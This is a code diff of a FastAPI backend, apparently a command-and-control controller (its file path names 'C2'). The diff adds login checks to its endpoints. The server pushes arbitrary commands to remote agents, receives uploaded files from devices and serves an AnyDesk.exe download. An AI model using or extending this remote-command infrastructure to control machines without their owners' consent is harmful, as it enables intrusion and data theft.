@@ -158,13 +158,13 @@ async def me(user: dict = Depends(get_current_user)):
 
 # ── Devices ──────────────────────────────────
 @app.get("/api/devices")
-async def list_devices():
+async def list_devices(user: dict = Depends(get_current_user)):
     p = await get_pool()
     rows = await p.fetch("SELECT * FROM devices ORDER BY last_seen DESC")
     return [dict(r) for r in rows]
 
 @app.get("/api/devices/{device_id}")
-async def get_device(device_id: str):
+async def get_device(device_id: str, user: dict = Depends(get_current_user)):
     p = await get_pool()
     row = await p.fetchrow("SELECT * FROM devices WHERE device_id = $1", device_id)
     if not row:
@@ -191,7 +191,7 @@ async def delete_device(device_id: str, user: dict = Depends(get_current_user)):
 
 # ── Commands ─────────────────────────────────
 @app.get("/api/commands")
-async def list_commands(device_id: str = None, status: str = None, limit: int = 50):
+async def list_commands(device_id: str = None, status: str = None, limit: int = 50, user: dict = Depends(get_current_user)):
     p = await get_pool()
     query = "SELECT * FROM commands WHERE 1=1"
     params = []
@@ -205,7 +205,7 @@ async def list_commands(device_id: str = None, status: str = None, limit: int = 
     return [dict(r) for r in rows]
 
 @app.post("/api/commands")
-async def send_command(device_id: str = Query(...), command: str = Query(...), timeout: int = 60):
+async def send_command(device_id: str = Query(...), command: str = Query(...), timeout: int = 60, user: dict = Depends(get_current_user)):
     """
     Gửi lệnh đến agent thông qua Redis pub/sub.
     Agent phải online và đã kết nối WebSocket.
@@ -245,7 +245,7 @@ async def send_command(device_id: str = Query(...), command: str = Query(...), t
 
 # ── Logs ─────────────────────────────────────
 @app.get("/api/logs")
-async def list_logs(device_id: str = None, level: str = None, limit: int = 100):
+async def list_logs(device_id: str = None, level: str = None, limit: int = 100, user: dict = Depends(get_current_user)):
     p = await get_pool()
     query = "SELECT * FROM logs WHERE 1=1"
     params = []
@@ -260,7 +260,7 @@ async def list_logs(device_id: str = None, level: str = None, limit: int = 100):
 
 # ── Alerts ───────────────────────────────────
 @app.get("/api/alerts")
-async def list_alerts(unread_only: bool = False, limit: int = 50):
+async def list_alerts(unread_only: bool = False, limit: int = 50, user: dict = Depends(get_current_user)):
     p = await get_pool()
     if unread_only:
         rows = await p.fetch("SELECT * FROM alerts WHERE is_read = FALSE ORDER BY created_at DESC LIMIT $1", limit)
@@ -269,14 +269,14 @@ async def list_alerts(unread_only: bool = False, limit: int = 50):
     return [dict(r) for r in rows]
 
 @app.put("/api/alerts/{alert_id}/read")
-async def mark_alert_read(alert_id: int):
+async def mark_alert_read(alert_id: int, user: dict = Depends(get_current_user)):
     p = await get_pool()
     await p.execute("UPDATE alerts SET is_read = TRUE WHERE alert_id = $1", alert_id)
     return {"status": "ok"}
 
 # ── Stats ────────────────────────────────────
 @app.get("/api/stats")
-async def get_stats():
+async def get_stats(user: dict = Depends(get_current_user)):
     p = await get_pool()
     online = await p.fetchval("SELECT COUNT(*) FROM devices WHERE status = 'online'")
     total_dev = await p.fetchval("SELECT COUNT(*) FROM devices")
@@ -291,7 +291,7 @@ async def get_stats():
     }
 
 @app.post("/api/upload/{device_id}")
-async def upload_file(device_id: str, file: bytes = None):
+async def upload_file(device_id: str, file: bytes = None, user: dict = Depends(get_current_user)):
     if not file:
         raise HTTPException(400, "No file data")
     import time
@@ -304,7 +304,7 @@ async def upload_file(device_id: str, file: bytes = None):
     return {"path": path, "size": len(file)}
 
 @app.get("/static/AnyDesk.exe")
-async def download_anydesk():
+async def download_anydesk(user: dict = Depends(get_current_user)):
     path = "D:\\C2\\controller\\static\\AnyDesk.exe"
     with open(path, "rb") as f:
         return Response(content=f.read(), media_type="application/octet-stream", headers={"Content-Disposition": "attachment; filename=AnyDesk.exe"})
